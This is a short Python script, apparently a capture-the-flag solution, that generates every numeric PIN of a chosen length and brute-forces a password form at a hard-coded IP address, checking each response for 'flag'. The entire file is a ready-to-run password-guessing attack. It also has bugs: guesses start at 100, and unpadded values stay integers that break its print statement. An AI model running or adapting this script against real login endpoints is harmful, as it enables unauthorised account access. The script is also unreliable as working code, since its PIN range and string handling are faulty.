import urllib
import requests
import time
import threading

passwordlist = []

def pwdListGenerate():
    global passwordlist

    print("请输入纯数字密码位数")
    input_len = input()

    min_num = 100
    max_num = '9' * (int(input_len))
    print(max_num)


    for i in range(min_num, int(max_num)+1):
        if len(str(i)) < int(input_len):
            i = '0' * (int(input_len) - len(str(i))) + str(i)

        passwordlist.append(i)

    print("密码生成完毕！")

def brust():
    for password in passwordlist:
        test = requests.post('http://114.67.175.224:13029/', data={'pwd': password})
        print("当前密码为：" + password)
        if 'flag' in test.text:
            print("正确的密码为:" + password)
            break


if __name__ == "__main__":
    pwdListGenerate()
    brust()
